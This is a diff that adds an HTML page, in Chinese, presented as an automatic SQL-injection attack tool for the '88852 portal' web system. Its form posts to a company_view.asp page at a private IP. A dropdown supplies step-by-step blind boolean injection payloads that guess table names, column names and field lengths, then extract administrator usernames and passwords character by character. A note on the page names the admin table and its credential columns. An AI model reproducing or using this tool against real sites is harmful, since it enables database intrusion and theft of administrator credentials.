@@ -1,0 +1,53 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
+<title>88852门户网注入自动攻击程序</title>
+<style type="text/css">
+<!--
+body {
+	background-color: #CCCCCC;
+}
+-->
+</style></head>
+
+<body>
+<table width="583" height="77" border="1" align=center>
+  <tr>
+    <td width="573" height="71"><form id="form1" name="form1" method="post" action="http://192.168.136.129/company_view.asp">
+      <table width="569" border="0">
+        <tr>
+          <td width="34" height="56">注入</td>
+          <td width="525"><label>
+          <input name="uid" type="text" id="uid" size="75" />
+          <input type="submit" name="Submit" value="提交">
+            <select name="select" id=wo onClick="layne()">
+              <option value="相应的表名和列名请按默认数据库中自行更改,tianhe为网站-招聘-公司参数UID值">------------------------Dream an end温馨提示-------------------</option>
+              <option value="tianhe' and exists(select * from 表名) and '1'='1">第一步：猜解表名</option>
+              <option value="tianhe' and exists(select 列名 from 表名) and '1'='1">第二步：猜解列名</option>
+              <option value="tianhe' and (select top 1 len(列名) from 表名)&gt;x and '1'='1">第三步：猜解列的长度</option>
+              <option value="tianhe' and (select top 1 asc(mid(列名，列数N，1)) from 表名)&gt;x and '1'='1">第四步：猜解用户名</option>
+              <option value="tianhe' and (select top 1 asc(mid(列名，列数N，1)) from 表名)&gt;x and '1'='1">第五步：猜解用户密码</option>
+              </select>
+            <script language=javascript>
+			function layne()
+			{
+			form1.uid.value=form1.wo.value;
+			}
+			</script>
+          </label></td>
+        </tr>
+      </table>
+        </form>
+    </td>
+  </tr>
+</table>
+<div>
+  <table width="587" border="1" align="center">
+    <tr>
+      <td width="577">提示：88852门户网系统管理员信息所在表名为：user_data;列名分别为username和password。</td>
+    </tr>
+  </table>
+</div>
+</body>
+</html>
